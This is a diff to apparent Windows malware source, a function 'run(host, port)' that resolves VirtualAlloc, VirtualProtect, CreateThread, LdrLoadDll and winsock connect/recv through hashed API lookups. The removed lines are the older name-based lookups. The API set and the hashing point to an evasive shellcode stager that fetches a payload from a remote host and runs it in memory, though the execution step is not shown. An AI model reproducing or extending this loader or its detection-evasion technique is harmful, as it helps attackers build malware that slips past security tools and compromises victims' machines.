@@ -46,17 +46,12 @@ int run(const char* host, const char* port)
 
 
 	// TODO: hash these string literals 
-    //FuncVirtualAlloc pVirtualAlloc = (FuncVirtualAlloc)GetProcAddressManual("kernel32.dll", "VirtualAlloc");
     FuncVirtualAlloc pVirtualAlloc = (FuncVirtualAlloc)GetProcAddressManualHash(kernel32_module, VIRTUALALLOC_HASH);
-    //FuncVirtualProtect pVirtualProtect = (FuncVirtualProtect)GetProcAddressManual("kernel32.dll", "VirtualProtect");
     FuncVirtualProtect pVirtualProtect = (FuncVirtualProtect)GetProcAddressManualHash(kernel32_module, VIRTUALPROTECT_HASH);
-    //FuncCreateThread pCreateThread = (FuncCreateThread)GetProcAddressManual("kernel32.dll", "CreateThread");
     FuncCreateThread pCreateThread = (FuncCreateThread)GetProcAddressManualHash(kernel32_module, CREATETHREAD_HASH);
-	//FuncWaitForSingleObject pWaitForSingleObject = (FuncWaitForSingleObject)GetProcAddressManual("kernel32.dll", "WaitForSingleObject");
     FuncWaitForSingleObject pWaitForSingleObject = (FuncWaitForSingleObject)GetProcAddressManualHash(kernel32_module, WAITFORSINGLEOBJECT_HASH);
 
     HMODULE ntdll_module = GetModuleHandleManualHash(NTDLL_DLL_HASH);
-    //FuncLdrLoadDll pLdrLoadDll = (FuncLdrLoadDll)GetProcAddressManual("ntdll.dll", "LdrLoadDll");
     FuncLdrLoadDll pLdrLoadDll = (FuncLdrLoadDll)GetProcAddressManualHash(ntdll_module, LDRLOADDLL_HASH);
 
     ////////////////////////////////////
@@ -103,23 +98,13 @@ int run(const char* host, const char* port)
 
     //HMODULE ws2_32_module = GetModuleHandleManualHash(WS2_32_DLL_HASH); // TODO: this would need to be changed to loadlib or something
 
-    //FuncWSAStartup pWSAStartup = (FuncWSAStartup)GetProcAddressManualM(ws2_32_module, "WSAStartup");
     FuncWSAStartup pWSAStartup = (FuncWSAStartup)GetProcAddressManualHash(ws2_32_module, WSASTARTUP_HASH);
-    //FuncWSACleanup pWSACleanup = (FuncWSACleanup)GetProcAddressManualM(dllBase, "WSACleanup");
     FuncWSACleanup pWSACleanup = (FuncWSACleanup)GetProcAddressManualHash(ws2_32_module, WSACLEANUP_HASH);
-    //FuncGetAddrInfo pGetAddrInfo = (FuncGetAddrInfo)GetProcAddressManualM(dllBase, "getaddrinfo");
     FuncGetAddrInfo pGetAddrInfo = (FuncGetAddrInfo)GetProcAddressManualHash(ws2_32_module, GETADDRINFO_HASH);
-    //FuncFreeAddrInfo pFreeAddrInfo = (FuncFreeAddrInfo)GetProcAddressManualM(dllBase, "freeaddrinfo");
     FuncFreeAddrInfo pFreeAddrInfo = (FuncFreeAddrInfo)GetProcAddressManualHash(ws2_32_module, FREEADDRINFO_HASH);
-    //FuncSocket pSocket = (FuncSocket)GetProcAddressManualM(dllBase, "socket");
     FuncSocket pSocket = (FuncSocket)GetProcAddressManualHash(ws2_32_module, SOCKET_HASH);
-    //FuncCloseSocket pCloseSocket = (FuncCloseSocket)GetProcAddressManualM(dllBase, "closesocket");
     FuncCloseSocket pCloseSocket = (FuncCloseSocket)GetProcAddressManualHash(ws2_32_module, CLOSESOCKET_HASH);
-    //FuncConnect pConnect = (FuncConnect)GetProcAddressManualM(dllBase, "connect");
     FuncConnect pConnect = (FuncConnect)GetProcAddressManualHash(ws2_32_module, CONNECT_HASH);
-    //FuncSend pSend = (FuncSend)GetProcAddressManual("ws2_32.dll", "send");
-    //FuncSend pSend = (FuncSend)GetProcAddressManual("ws2_32.dll", "send");
-    //FuncRecv pRecv = (FuncRecv)GetProcAddressManualM(dllBase, "recv");
     FuncRecv pRecv = (FuncRecv)GetProcAddressManualHash(ws2_32_module, RECV_HASH);
 
     //std::cout << "1 - Starting" << std::endl;
